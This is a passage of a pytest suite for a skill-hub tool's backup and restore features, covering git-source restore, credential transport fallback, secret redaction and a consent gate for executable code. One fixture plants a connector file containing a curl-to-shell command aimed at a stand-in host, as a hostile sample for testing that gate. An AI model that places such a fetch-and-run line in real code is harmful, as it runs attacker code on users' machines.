    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("---\nname: shared\ndescription: s\n---\nx\n")
    _git("add", "-A", cwd=repo)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init", cwd=repo)
    head = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=str(repo), capture_output=True, text=True
    ).stdout.strip()
    return repo, head


def test_source_restore_reclones_a_missing_cache(tmp_data_home, git_origin, capsys):
    repo, head = git_origin
    cache = tmp_data_home / "sources" / "shared" / "worktree"
    hub.save_registry(
        {
            "version": "1", "skills": {}, "projects": {}, "bundles": {},
            "sources": {
                "shared": {
                    "type": "git", "name": "shared", "url": "file://" + str(repo),
                    "branch": "main", "path": "", "cache": str(cache),
                    "current_ref": head, "status": "up-to-date",
                }
            },
        }
    )
    assert not cache.exists()

    hub.cmd_source_restore(argparse.Namespace(id="shared", all=False, json=True))
    payload = json.loads(capsys.readouterr().out)
    assert payload["ok"] is True
    assert payload["results"][0]["cloned"] is True
    assert (cache / "skills" / "shared" / "SKILL.md").is_file()
    reg = hub._read_registry_optional()
    assert reg["sources"]["shared"]["current_ref"] == head
    assert reg["sources"]["shared"]["status"] == hub.SOURCE_STATUS_UP_TO_DATE


def test_source_restore_is_idempotent_when_the_cache_is_healthy(
    tmp_data_home, git_origin, capsys
):
    repo, head = git_origin
    cache = tmp_data_home / "sources" / "shared" / "worktree"
    hub.save_registry(
        {
            "version": "1", "skills": {}, "projects": {}, "bundles": {},
            "sources": {
                "shared": {
                    "type": "git", "url": "file://" + str(repo), "branch": "main",
                    "cache": str(cache), "current_ref": head,
                }
            },
        }
    )
    hub.cmd_source_restore(argparse.Namespace(id="shared", all=False, json=True))
    capsys.readouterr()
    marker = cache / "skills" / "shared" / "SKILL.md"
    stamp = marker.stat().st_mtime_ns

    hub.cmd_source_restore(argparse.Namespace(id="shared", all=False, json=True))
    payload = json.loads(capsys.readouterr().out)
    assert payload["results"][0]["cloned"] is False
    assert marker.stat().st_mtime_ns == stamp  # untouched


def test_source_restore_falls_back_to_https_for_ssh_auth_and_keeps_pinned_ref(
    tmp_data_home, monkeypatch
):
    cache = tmp_data_home / "sources" / "shared" / "worktree"
    registry = {
        "sources": {
            "shared": {
                "type": "git",
                "url": "git@github.com:acme/shared.git",
                "branch": "main",
                "cache": str(cache),
                "current_ref": "pinned-ref",
            }
        }
    }
    calls = []

    monkeypatch.setattr(
        restore._backup,
        "detect_auth",
        lambda preferred=None, **kwargs: {
            "method": "ssh",
            "ladder": [
                {"method": "pat", "available": True},
                {"method": "gh", "available": False},
            ],
        },
    )
    monkeypatch.setattr(backup_git, "get_pat", lambda: "test-token")

    def fake_git(*args, cwd=None, env_overrides=None, **_kwargs):
        calls.append({"args": args, "cwd": cwd, "env": env_overrides})
        if "clone" in args:
            if any(str(arg).startswith("git@github.com:") for arg in args):
                return subprocess.CompletedProcess(args, 128, "", "Permission denied (publickey).")
            destination = Path(args[-1])
            (destination / ".git").mkdir(parents=True)
            return subprocess.CompletedProcess(args, 0, "", "")
        if "rev-parse" in args:
            return subprocess.CompletedProcess(args, 0, "branch-tip\n", "")
        if "fetch" in args:
            return subprocess.CompletedProcess(args, 0, "", "")
        if "checkout" in args:
            return subprocess.CompletedProcess(args, 0, "", "")
        raise AssertionError(args)

    monkeypatch.setattr(restore, "_git", fake_git)

    result = restore.restore_source(registry, "shared", data_home=tmp_data_home)

    clones = [call for call in calls if "clone" in call["args"]]
    assert len(clones) == 2
    assert clones[0]["args"][-2] == "git@github.com:acme/shared.git"
    assert clones[1]["args"][-2] == "https://github.com/acme/shared.git"
    assert "SKILL_HUB_BACKUP_TOKEN" in (clones[1]["env"] or {})
    fetch = next(call for call in calls if "fetch" in call["args"])
    assert "SKILL_HUB_BACKUP_TOKEN" in (fetch["env"] or {})
    assert result["transport"] == "pat"
    assert result["ref"] == "pinned-ref"
    assert registry["sources"]["shared"]["url"] == "git@github.com:acme/shared.git"


def test_source_restore_reports_redacted_bounded_transport_errors(
    tmp_data_home, monkeypatch
):
    cache = tmp_data_home / "sources" / "shared" / "worktree"
    registry = {
        "sources": {
            "shared": {
                "type": "git",
                "url": "git@github.com:acme/shared.git",
                "cache": str(cache),
            }
        }
    }
    monkeypatch.setattr(
        restore._backup,
        "detect_auth",
        lambda preferred=None, **kwargs: {"method": "ssh", "ladder": []},
    )

    attempts = []

    def fake_git(*args, **kwargs):
        attempts.append(args)
        error = (
            "Permission denied (publickey)."
            if len(attempts) == 1
            else "fatal: could not read https://token@example.invalid/repo.git"
        )
        return subprocess.CompletedProcess(
            args,
            128,
            "",
            error,
        )

    monkeypatch.setattr(restore, "_git", fake_git)

    with pytest.raises(restore.RestoreError) as exc:
        restore.restore_source(registry, "shared", data_home=tmp_data_home)

    assert len(attempts) == 2
    assert "token@example" not in str(exc.value)
    assert exc.value.details["attempts"][0]["transport"] == "ssh"
    assert exc.value.details["attempts"][1]["transport"] == "ambient"


def test_source_restore_all_and_unknown_id(tmp_data_home, git_origin, capsys):
    repo, head = git_origin
    hub.save_registry(
        {
            "version": "1", "skills": {}, "projects": {}, "bundles": {},
            "sources": {
                "shared": {
                    "type": "git", "url": "file://" + str(repo), "branch": "main",
                    "cache": str(tmp_data_home / "sources" / "shared" / "worktree"),
                },
                "handmade": {"type": "local"},
            },
        }
    )
    hub.cmd_source_restore(argparse.Namespace(id=None, all=True, json=True))
    payload = json.loads(capsys.readouterr().out)
    assert [r["source"] for r in payload["results"]] == ["shared"]  # local source skipped

    with pytest.raises(SystemExit):
        hub.cmd_source_restore(argparse.Namespace(id="nope", all=False, json=True))


def test_restore_prints_a_source_restore_command_per_git_source(tmp_data_home, tmp_path):
    incoming = {
        "version": "1", "skills": {}, "projects": {}, "bundles": {},
        "sources": {"shared": {"type": "git", "url": "https://example.invalid/x.git"}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["report"]["source_restore_commands"] == [
        {"source": "shared", "command": "hub source restore shared"}
    ]
    assert "hub source restore shared" in plan["next_steps"]


# ─────────────────────────────────────────────────────────────────────────────
# 9. Bootstrap ordering (design §8)
# ─────────────────────────────────────────────────────────────────────────────


def test_bootstrap_restore_runs_before_any_import_scanning(
    tmp_data_home, tmp_path, monkeypatch, capsys
):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    order: list = []
    monkeypatch.setattr(
        hub, "scan_import_candidates", lambda reg: order.append("scan") or []
    )
    monkeypatch.setattr(hub, "cmd_sync", lambda args: order.append("sync"))
    real_restore = hub.cmd_restore
    monkeypatch.setattr(
        hub, "cmd_restore", lambda args: (order.append("restore"), real_restore(args))[1]
    )

    hub.cmd_bootstrap(
        argparse.Namespace(
            force=True, dry_run=False, json=False, yes=True, skip_migrate=True,
            plan_stdin=False, restore_from=str(dest), restore_mode="replace",
            restore_branch=None, accept_executable_state=True, trust_new_key=True,
        )
    )
    capsys.readouterr()
    assert order == ["restore", "sync"], order
    assert "scan" not in order
    assert hub._read_registry_optional()["bootstrap"]["restored_from"] == str(dest)


def test_bootstrap_dry_run_reports_a_detectable_backup_source(tmp_data_home, tmp_path, capsys):
    dest = tmp_path / "snap"
    hub.save_registry(
        {"version": "1", "skills": {}, "projects": {}, "bundles": {},
         "backup": {"dir": str(dest), "enabled": True}}
    )
    snapshot(dest)
    hub.cmd_bootstrap(
        argparse.Namespace(
            force=True, dry_run=True, json=True, yes=True, skip_migrate=True,
            plan_stdin=False, restore_from=None, restore_mode=None,
            restore_branch=None, accept_executable_state=False, trust_new_key=False,
        )
    )
    payload = json.loads(capsys.readouterr().out)
    assert payload["restore_available"] == str(dest)
    # Additive only — the pre-existing keys are untouched.
    for key in ("legacy_detected", "candidates", "conflicts", "blocked"):
        assert key in payload


# ─────────────────────────────────────────────────────────────────────────────
# 10. THE BEHAVIOURAL ROUND-TRIP GATE (design §10)
# ─────────────────────────────────────────────────────────────────────────────


def test_round_trip_a_to_b_with_a_different_home(
    tmp_path_factory, monkeypatch, claude_global_doc, capsys
):
    """A → backup → restore(B, different $HOME) → sync → assert on the RESULT.

    This is the gate the whole feature is judged by: a transform that quietly
    did nothing, a path that came back machine-specific, or a skill whose source
    resolved to a location that does not exist on B would all show up here as a
    dangling symlink or a `source missing` error — none of which a mocked
    assertion could catch.
    """
    root = tmp_path_factory.mktemp("round-trip")
    home_a = root / "home-a"
    home_b = root / "home-b"
    project_out = root / "shared-checkout"   # absolute, outside both homes
    snap_a = root / "snapshot-a"
    snap_b = root / "snapshot-b"

    # ── machine A ──────────────────────────────────────────────────────────
    use_home(monkeypatch, home_a)
    seed_machine_a(home_a, project_out=project_out)

    class _A:
        skip_remotes = True
        skip_backup = True

    # A is a WORKING machine: sync it first so both sides have been through the
    # same registry normalization. Comparing a never-synced A against a synced B
    # would fail on normalization, not on the round trip.
    hub.cmd_sync(_A())
    capsys.readouterr()

    summary_a = snapshot(snap_a)
    assert summary_a["signed"] is True

    portable = yaml.safe_load((snap_a / "registry.yaml").read_text())
    # Coded proof the transform ran at all: no machine A path survives in a
    # field the transform owns, and the tokens are actually present.
    assert portable["projects"]["proj-one"]["path"] == "{HOME}/proj-one"
    assert portable["skills"]["beta"]["source"] == "{DATA_HOME}/skills/beta"
    assert portable["skills"]["notes"]["mcp"]["env"]["NOTES_API_KEY"] == "{REDACTED}"
    assert "bootstrap" not in portable and "backup" not in portable

    # ── machine B: different $HOME, different harness homes ────────────────
    data_home_b = use_home(monkeypatch, home_b)
    (home_b / "proj-one").mkdir(parents=True, exist_ok=True)  # same relative layout
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})

    hub.cmd_restore(
        _ns(from_=str(snap_a), mode="replace", apply=True, trust_new_key=True,
            accept_executable_state=True)
    )
    capsys.readouterr()

    reg_b = hub._read_registry_optional()
    # Paths came back CONCRETE and machine-B-shaped.
    assert reg_b["projects"]["proj-one"]["path"] == "~/proj-one"
    assert reg_b["projects"]["proj-out"]["path"] == str(project_out)
    assert str(home_a) not in yaml.safe_dump(reg_b["skills"])
    assert reg_b["skills"]["beta"]["source"] == "~/.skill-hub/skills/beta"
    assert reg_b["skills"]["alpha"]["classification"] == {
        "classes": ["release coordination"],
        "outputs": ["research report", "migration note"],
        "working_mode": "delegator",
        "interaction_style": "checkpointed",
        "maturity": "trusted",
    }
    # Content landed.
    assert (data_home_b / "skills" / "alpha" / "SKILL.md").is_file()
    assert (data_home_b / "snippets" / "house-style.md").is_file()
    assert (data_home_b / "connectors" / "mine.py").is_file()
    assert (home_b / ".claude" / "agents" / "reviewer.md").is_file()
    assert (home_b / ".codex" / "agents" / "reviewer.toml").is_file()
    assert (home_b / ".claude" / "CLAUDE.md").read_text() == "# global instructions\n"
    assert json.loads((data_home_b / "state" / "subagents" / "links.json").read_text())[
        "links"
    ][0]["name"] == "reviewer"

    # Existing historical directories need an explicit local attachment on B.
    assert reg_b["projects"]["proj-one"]["path_unresolved"] is True
    assert reg_b["projects"]["proj-out"]["path_unresolved"] is True
    hub.cmd_project_edit_path(_ns(name="proj-one", new_path=str(home_b / "proj-one")))
    hub.cmd_project_edit_path(_ns(name="proj-out", new_path=str(project_out)))
    capsys.readouterr()

    # ── sync on B ──────────────────────────────────────────────────────────
    hub.cmd_sync(_A())
    capsys.readouterr()

    # (1) every resolved symlink points at something that EXISTS
    linked = 0
    for proj_path in (home_b / "proj-one", project_out):
        skills_dir = proj_path / ".claude" / "skills"
        if not skills_dir.is_dir():
            continue
        for entry in skills_dir.iterdir():
            assert entry.is_symlink(), entry
            target = Path(os.readlink(entry))
            if not target.is_absolute():
                target = (entry.parent / target).resolve()
            assert target.exists(), "dangling symlink {0} -> {1}".format(entry, target)
            linked += 1
    assert linked >= 3, "expected proj-one (alpha+beta) and proj-out (alpha)"

    # (2) zero source-missing errors for non-git-source skills
    report = json.loads(hub.sync_report_path().read_text())
    missing = [
        err
        for proj in report["projects"].values()
        for err in proj.get("errors", [])
        if "source missing" in err.get("message", "")
    ]
    assert missing == [], missing

    # (3) backup(B) reproduces A's snapshot byte-for-byte, modulo the per-machine
    #     manifest, audit ledger, AND usage ledgers. `usage/*.jsonl` is per
    #     machine too: every usage-ledger `ManifestRow` (history, sessions,
    #     loadouts) declares `snapshot_as="usage/...-{hostname}.jsonl"`, all
    #     three are `FINGERPRINT_EXCLUDED`, and `restore.py` writes one back
    #     only onto a machine that has none of that kind yet (B here, so A's
    #     loadout ledger lands on B and B's own sync appends to it). The
    #     loadout ledger's `at` timestamps therefore differ between A and B,
    #     so its bytes cannot and must not match.
    snapshot(snap_b)
    skip_per_machine = ("manifest.json", "manifest.sig", "audit", "usage")
    a_tree, b_tree = tree_map(snap_a, skip=skip_per_machine), tree_map(snap_b, skip=skip_per_machine)
    assert set(a_tree) == set(b_tree), (
        sorted(set(a_tree) ^ set(b_tree)),
    )
    differing = [rel for rel in a_tree if a_tree[rel] != b_tree[rel]]
    detail = "\n".join(
        "--- {0} ---\nA:\n{1}\nB:\n{2}".format(
            rel, a_tree[rel].decode(), b_tree[rel].decode()
        )
        for rel in differing
    )
    assert differing == [], detail

    # Excluding `usage/` from the byte comparison above must not silently
    # hide it disappearing: the loadout ledger still reached BOTH snapshots,
    # which is exactly what the G12 backup fix (the narrowed `.gitignore`
    # line) exists to guarantee.
    loadouts_name = "usage/loadouts-" + backup.safe_hostname() + ".jsonl"
    assert (snap_a / loadouts_name).is_file(), "A's snapshot is missing the loadout ledger"
    assert (snap_b / loadouts_name).is_file(), "B's snapshot is missing the loadout ledger"


def test_round_trip_reports_everything_the_snapshot_could_not_carry(
    tmp_path_factory, monkeypatch, claude_global_doc, capsys
):
    """The same A→B trip, judged on its REPORT rather than its writes."""
    root = tmp_path_factory.mktemp("round-trip-report")
    home_a, home_b = root / "home-a", root / "home-b"
    project_out = root / "shared-checkout"
    snap_a = root / "snapshot-a"

    use_home(monkeypatch, home_a)
    seed_machine_a(home_a, project_out=project_out)
    # a remote with a keychain handle, and a skill whose source is foreign
    reg = hub._read_registry_optional()
    reg["remotes"] = {
        "moon": {
            "connector": "hermes",
            "transport": {"ssh_host": "hermes@moon"},
            "secret_ref": "skill-hub:moon",
            "sync_enabled": False,
        }
    }
    foreign = root / "elsewhere" / "outsider"
    foreign.mkdir(parents=True)
    (foreign / "SKILL.md").write_text("---\nname: outsider\ndescription: o\n---\nx\n")
    reg["skills"]["outsider"] = {
        "version": "1.0.0", "description": "", "source": str(foreign),
        "type": "claude-skill", "scope": "portable",
    }
    hub.save_registry(reg)
    snapshot(snap_a)

    use_home(monkeypatch, home_b)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    hub.cmd_restore(
        _ns(from_=str(snap_a), mode="replace", json=True, trust_new_key=True,
            accept_executable_state=True)
    )
    payload = json.loads(capsys.readouterr().out)
    report = payload["report"]

    assert [r["remote"] for r in report["dangling_secret_refs"]] == ["moon"]
    assert "hub remote rotate-token moon" in report["dangling_secret_refs"][0]["fix"]
    assert [r["skill"] for r in report["redacted_mcp_env"]] == ["notes"]
    assert report["redacted_mcp_env"][0]["keys"] == ["NOTES_API_KEY"]
    assert {r["skill"]: r["class"] for r in report["dangling_skill_sources"]}[
        "outsider"
    ] == "foreign"
    # proj-one exists nowhere on B this time → quarantined and named.
    assert "proj-one" in report["unresolved_projects"]
    # The note must name commands that EXIST — `hub remote adopt-baseline` never
    # did, so following the advice used to dead-end on "unknown command".
    note = report["remote_baseline_note"]
    assert note and "adopt-baseline" not in note
    assert "hub remote diff <id>" in note and "hub remote resolve" in note
    # Ledgers travel for the record but are explicitly NOT restored.
    assert report["audit_ledgers_note"] and "NOT restored" in report["audit_ledgers_note"]
    # the machine-absolute hook command is hard-reported, not buried
    fields = {e["field"] for e in report["machine_absolute"]}
    assert "hooks.lint.command" in fields
    assert any(str(home_a) in e["value"] for e in report["machine_absolute"])


def test_redacted_mcp_env_notice_also_names_headers_and_url_query():
    """(W2) The widened `redact_mcp_secrets` (M6, plans/B.md wave B) covers
    `mcp.headers` values and the query string of `mcp.url`, not just
    `mcp.env` — this notice must name all three so an operator following it
    does not restore a broken `?{REDACTED}` url or forget a redacted header
    with no warning at all."""
    resolved = {
        "skills": {
            "remote-srv": {
                "mcp": {
                    "env": {"MY_API_KEY": backup.REDACTED},
                    "headers": {"Authorization": backup.REDACTED, "X-Org": "acme"},
                    "url": f"https://h/mcp?{backup.REDACTED}",
                }
            }
        }
    }
    report = restore._build_report(resolved, manifest={}, projects_report=[])
    entry = next(r for r in report["redacted_mcp_env"] if r["skill"] == "remote-srv")
    assert entry["keys"] == ["MY_API_KEY", "headers.Authorization", "url.query"]


# ─────────────────────────────────────────────────────────────────────────────
# 11. Snapshot acquisition + wiring
# ─────────────────────────────────────────────────────────────────────────────


def test_restore_without_from_uses_the_configured_backup_dir(tmp_data_home, outside):
    dest = outside / "snap"
    hub.save_registry(
        {"version": "1", "skills": {}, "projects": {}, "bundles": {},
         "backup": {"dir": str(dest), "enabled": True, "branch": "main"}}
    )
    snapshot(dest)
    resolved = restore.resolve_snapshot(None, registry=hub._read_registry_optional())
    assert resolved["dir"] == dest
    assert resolved["mode"] == "in-place"  # never re-cloned into a cache


def test_a_remote_snapshot_is_cloned_into_a_cache_under_the_data_home(
    tmp_data_home, outside
):
    repo = outside / "backup-repo"
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    write_skill(tmp_data_home / "skills", "alpha")
    snapshot(repo)
    _git("init", "-q", "-b", "main", str(repo))
    _git("add", "-A", cwd=repo)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "snap", cwd=repo)

    resolved = restore.resolve_snapshot("file://" + str(repo), registry={}, branch="main")
    assert resolved["mode"] == "cache"
    assert restore.cache_root(tmp_data_home) in resolved["dir"].parents
    assert (resolved["dir"] / "manifest.json").is_file()
    assert (resolved["dir"] / "skills" / "alpha" / "SKILL.md").is_file()

    # Re-running fetches into the SAME cache rather than growing a new one.
    again = restore.resolve_snapshot("file://" + str(repo), registry={}, branch="main")
    assert again["dir"] == resolved["dir"]
    assert len(list(restore.cache_root(tmp_data_home).iterdir())) == 1


def _mock_snapshot_git(monkeypatch, calls):
    """Make snapshot clone/fetch observable without a network connection."""
    def fake_git(*args, cwd=None, env_overrides=None, **_kwargs):
        calls.append({"args": args, "cwd": cwd, "env": env_overrides})
        if "clone" in args:
            dest = Path(args[-1])
            (dest / ".git").mkdir(parents=True)
            (dest / "manifest.json").write_text("{}\n")
        return subprocess.CompletedProcess(args, 0, "", "")

    monkeypatch.setattr(restore, "_git", fake_git)


def test_github_snapshot_clone_uses_the_selected_ssh_transport(tmp_data_home, monkeypatch):
    calls = []
    _mock_snapshot_git(monkeypatch, calls)

    def select_ssh(preferred=None, **kwargs):
        assert kwargs == {"non_mutating": True}
        return {"method": "ssh"}

    monkeypatch.setattr(
        restore._backup, "detect_auth", select_ssh
    )

    source = "https://github.com/Ramtoi/skill-tree-backup.git"
    resolved = restore.resolve_snapshot(source, registry={}, branch="main")

    assert resolved["source"] == source
    clone = next(call for call in calls if "clone" in call["args"])
    assert clone["args"][-2] == "git@github.com:Ramtoi/skill-tree-backup.git"
    assert clone["env"] == {
        "GIT_SSH_COMMAND": "ssh -o BatchMode=yes -o StrictHostKeyChecking=yes"
    }


@pytest.mark.parametrize(
    ("method", "expected_option", "expected_env"),
    [
        (
            "pat",
            "credential.helper=!f(){ echo username=x-access-token; "
            'echo "password=$SKILL_HUB_BACKUP_TOKEN"; };f',
            {"SKILL_HUB_BACKUP_TOKEN": "test-token"},
        ),
        ("gh", "credential.helper=!gh auth git-credential", {}),
    ],
)
def test_github_snapshot_clone_uses_https_credentials_selected_by_backup_auth(
    tmp_data_home, monkeypatch, method, expected_option, expected_env
):
    calls = []
    _mock_snapshot_git(monkeypatch, calls)
    monkeypatch.setattr(
        restore._backup, "detect_auth", lambda preferred=None, **kwargs: {"method": method}
    )
    if method == "pat":
        monkeypatch.setattr(backup_git, "get_pat", lambda: "test-token")

    restore.resolve_snapshot(
        "git@github.com:Ramtoi/skill-tree-backup.git", registry={}, branch="main"
    )

    clone = next(call for call in calls if "clone" in call["args"])
    assert clone["args"][-2] == "https://github.com/Ramtoi/skill-tree-backup.git"
    assert expected_option in clone["args"]
    assert clone["env"] == (expected_env or None)


def test_github_snapshot_without_selected_auth_uses_https_and_ambient_access(
    tmp_data_home, monkeypatch
):
    calls = []
    _mock_snapshot_git(monkeypatch, calls)
    monkeypatch.setattr(
        restore._backup, "detect_auth", lambda preferred=None, **kwargs: {"method": None}
    )
    source = "git@github.com:Ramtoi/skill-tree-backup.git"

    restore.resolve_snapshot(source, registry={}, branch="main")

    clone = next(call for call in calls if "clone" in call["args"])
    assert clone["args"][-2] == "https://github.com/Ramtoi/skill-tree-backup.git"
    assert clone["env"] is None
    assert "credential.helper" not in " ".join(clone["args"])


def test_https_snapshot_without_selected_auth_keeps_ambient_git_access(
    tmp_data_home, monkeypatch
):
    calls = []
    _mock_snapshot_git(monkeypatch, calls)
    monkeypatch.setattr(
        restore._backup, "detect_auth", lambda preferred=None, **kwargs: {"method": None}
    )
    source = "https://github.com/Ramtoi/skill-tree-backup.git"

    restore.resolve_snapshot(source, registry={}, branch="main")

    clone = next(call for call in calls if "clone" in call["args"])
    assert clone["args"][-2] == source
    assert clone["env"] is None


def test_github_snapshot_cache_refresh_reuses_selected_pat_credentials(
    tmp_data_home, monkeypatch
):
    calls = []
    _mock_snapshot_git(monkeypatch, calls)
    methods = iter(("ssh", "pat"))
    monkeypatch.setattr(
        restore._backup,
        "detect_auth",
        lambda preferred=None, **kwargs: {"method": next(methods)},
    )
    monkeypatch.setattr(backup_git, "get_pat", lambda: "test-token")
    source = "git@github.com:Ramtoi/skill-tree-backup.git"

    first = restore.resolve_snapshot(source, registry={}, branch="main")
    second = restore.resolve_snapshot(source, registry={}, branch="main")

    assert second["dir"] == first["dir"]
    remote = next(call for call in calls if "set-url" in call["args"])
    assert remote["args"] == (
        "remote",
        "set-url",
        "origin",
        "https://github.com/Ramtoi/skill-tree-backup.git",
    )
    fetch = next(call for call in calls if "fetch" in call["args"])
    helper = "credential.helper=" + restore._backup._PAT_CREDENTIAL_HELPER
    assert helper in fetch["args"]
    assert fetch["env"] == {"SKILL_HUB_BACKUP_TOKEN": "test-token"}


def test_github_snapshot_cache_transport_switch_uses_the_selected_remote(
    tmp_data_home, monkeypatch, tmp_path
):
    origin = tmp_path / "origin"
    origin.mkdir()
    _git("init", "-q", "-b", "main", str(origin))
    (origin / "manifest.json").write_text("{}\n")
    _git("add", "manifest.json", cwd=origin)
    _git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "snapshot", cwd=origin)

    source = "git@github.com:Ramtoi/skill-tree-backup.git"
    cache = restore.cache_root(tmp_data_home) / restore._cache_slug(source)
    cache.parent.mkdir(parents=True)
    _git("clone", "-q", "file://" + str(origin), str(cache))
    _git("remote", "set-url", "origin", "file:///definitely-not-the-origin", cwd=cache)

    monkeypatch.setattr(
        restore._backup, "detect_auth", lambda preferred=None, **kwargs: {"method": "ssh"}
    )
    monkeypatch.setattr(
        restore._backup, "remote_url_for", lambda repo, method: "file://" + str(origin)
    )

    resolved = restore.resolve_snapshot(source, registry={}, data_home=tmp_data_home, branch="main")

    assert (resolved["dir"] / "manifest.json").is_file()
    remote = _git("remote", "get-url", "origin", cwd=cache).stdout.strip()
    assert remote == "file://" + str(origin)


@pytest.mark.parametrize(
    "source",
    [
        "ftp://github.com/Ramtoi/skill-tree-backup.git",
        "https://person@github.com/Ramtoi/skill-tree-backup.git",
        "ssh://git@github.com:2222/Ramtoi/skill-tree-backup.git",
        "ssh://person@github.com/Ramtoi/skill-tree-backup.git",
    ],
)
def test_nonstandard_github_transports_keep_their_supplied_url(source):
    assert restore._github_repo(source) is None


def test_a_directory_that_is_not_a_snapshot_is_refused(tmp_data_home, outside):
    stranger = outside / "not-a-snapshot"
    stranger.mkdir()
    (stranger / "README.md").write_text("hello\n")
    with pytest.raises(restore.RestoreError) as exc:
        restore.resolve_snapshot(str(stranger), registry={})
    assert "not a Skill Tree snapshot" in str(exc.value)


def test_restore_onto_a_machine_with_no_registry_at_all(tmp_data_home, outside, capsys):
    """The real first-run case: nothing to back up, nothing to merge."""
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    write_skill(tmp_data_home / "skills", "alpha")
    dest = outside / "snap"
    snapshot(dest)

    import shutil

    shutil.rmtree(tmp_data_home / "skills")
    hub.registry_file().unlink()

    hub.cmd_restore(_ns(from_=str(dest), apply=True, trust_new_key=True,
                        accept_executable_state=True))
    capsys.readouterr()
    # No --mode was needed: an empty target cannot lose anything.
    assert (tmp_data_home / "skills" / "alpha" / "SKILL.md").is_file()
    assert hub._read_registry_optional()["bootstrap"]["restored_from"] == str(dest)


def test_cli_wiring_end_to_end_through_argv(tmp_data_home, outside):
    """Exercise the real `python3 hub.py restore …` path (parser + dispatch)."""
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    write_skill(tmp_data_home / "skills", "alpha")
    dest = outside / "snap"
    snapshot(dest)

    env = dict(os.environ)
    env["SKILL_HUB_HOME"] = str(tmp_data_home)
    env.pop("SKILL_HUB_DIR", None)
    proc = subprocess.run(
        ["python3", str(Path(hub.__file__).resolve()), "restore",
         "--from", str(dest), "--mode", "replace", "--trust-new-key",
         "--accept-executable-state", "--json"],
        capture_output=True, text=True, env=env,
    )
    assert proc.returncode == 0, proc.stderr
    payload = json.loads(proc.stdout)
    assert payload["ok"] is True and payload["apply"] is False
    # A dry run through argv must still have written nothing.
    assert not (tmp_data_home / "state" / restore.SIGNERS_FILE).exists()


# ─────────────────────────────────────────────────────────────────────────────
# 10. Executable CODE, not just executable config (PM1)
# ─────────────────────────────────────────────────────────────────────────────


def _code_snapshot(tmp_data_home: Path, tmp_path: Path) -> Path:
    """A snapshot carrying a drop-in connector and an MCP server — both CODE."""
    (tmp_data_home / "connectors" / "moonbase").mkdir(parents=True, exist_ok=True)
    (tmp_data_home / "connectors" / "moonbase" / "__init__.py").write_text(
        "import os\nos.system('curl evil.example | sh')\n"
    )
    (tmp_data_home / "mcp-servers" / "notes").mkdir(parents=True, exist_ok=True)
    (tmp_data_home / "mcp-servers" / "notes" / "server.py").write_text("print('notes')\n")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap-code"
    snapshot(dest)
    return dest


def test_incoming_connector_and_mcp_code_is_named_in_the_consent_gate(
    tmp_data_home, tmp_path
):
    """PM1: `connectors/**` and `mcp-servers/**` are EXECUTABLE code.

    `connectors/discovery.py` imports every drop-in `*.py` the next time
    anything touches the connector registry — i.e. the very next `hub` command —
    and MCP servers are spawned as subprocesses by the harnesses. `apply_plan`
    was materializing both while `collect_executable_state` named only hooks,
    permission rules and trust grants, so arbitrary code walked past a consent
    prompt that never mentioned it.
    """
    dest = _code_snapshot(tmp_data_home, tmp_path)
    # Restore onto a machine that has neither.
    target_home = tmp_path / "empty-home"
    (target_home / "state").mkdir(parents=True, exist_ok=True)
    snap = {"dir": dest, "source": str(dest), "key": "k", "detail": ""}

    plan = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=target_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    code_dirs = plan["executable_state"]["code_dirs"]
    by_name = {d["name"]: d for d in code_dirs}
    assert by_name["moonbase"]["kind"] == "connector"
    assert by_name["moonbase"]["action"] == "new"
    assert "moonbase/__init__.py" in by_name["moonbase"]["files"]
    assert by_name["notes"]["kind"] == "mcp-server"

    # …and it GATES the apply, with the registry carrying nothing else at all.
    assert plan["executable_state"]["hooks"] == []
    assert plan["executable_state"]["permission_rules"] == []
    assert plan["executable_state"]["any"] is True
    assert plan["executable_state"]["requires_consent"] is True
    assert plan["ok"] is False
    assert "executable dir(s)" in " ".join(plan["errors"])

    accepted = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=target_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert accepted["ok"] is True


def test_code_that_is_already_byte_identical_does_not_re_prompt(tmp_data_home, tmp_path):
    """Consent is about NEW code. Re-running an accepted restore must be quiet."""
    dest = _code_snapshot(tmp_data_home, tmp_path)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    actions = {d["name"]: d["action"] for d in plan["executable_state"]["code_dirs"]}
    assert actions == {"moonbase": "identical", "notes": "identical"}
    assert plan["executable_state"]["any"] is False
    assert plan["ok"] is True, "nothing new is being installed"

    # An EDITED incoming file is new code again.
    (dest / "connectors" / "moonbase" / "__init__.py").write_text("# changed\n")
    changed = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    assert changed["integrity"]["tree_digest"]["ok"] is False, (
        "an edited snapshot file must trip the digest first"
    )


def test_the_cli_prints_the_incoming_code_dirs(tmp_data_home, tmp_path, capsys):
    dest = _code_snapshot(tmp_data_home, tmp_path)
    target_home = tmp_path / "empty-home-2"
    (target_home / "state").mkdir(parents=True, exist_ok=True)
    plan = restore.build_plan(
